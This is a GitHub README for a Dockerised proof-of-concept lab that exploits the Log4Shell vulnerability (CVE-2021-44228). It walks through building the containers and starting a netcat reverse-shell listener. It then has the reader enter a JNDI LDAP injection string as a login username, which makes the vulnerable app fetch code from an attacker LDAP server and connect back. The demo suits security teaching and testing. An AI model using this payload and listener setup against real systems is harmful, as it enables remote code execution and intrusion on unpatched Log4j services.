# log4j-poc

## An LDAP exploit for CVE-2021-44228 Log4Shell

### Description

The exploit code in this demo is based on that found at https://github.com/kozmer/log4j-shell-poc

### Prerequisites

This code requires Docker and Docker Compose

### Installation

``` git clone https://github.com/cyberxml/log4j-poc
cd log4j-poc
# edit docker-compose.yml to addjust the environment variables as needed.
# The listener IP address is the address of the machine on which you will run the netcat 'nc' listener
# This can be the local IP of the docker hostmachine.
docker-compose build
```

### Run

1. Setup you docker listener in the first terminal
    1. `nc -lv 10.10.10.31 9001`
1. Start the docker containers in a second terminal
    1. `docker-compose up`
1. Navigate to the web app on port 8080
    1. Navigate to http://10.10.10.31:8080/log4shell
        1. Enter the username: `admin`
        1. Enter the password: `password`
        1. Select the "login" button
        1. See the welcome screen 
    1. Return to login at http://10.10.10.31:8080/log4shell
        1. Enter the username `${jndi:ldap://172.16.238.11:1389/a}`
        1. Select the "login" button
        1. Check for connection on your `nc` listener
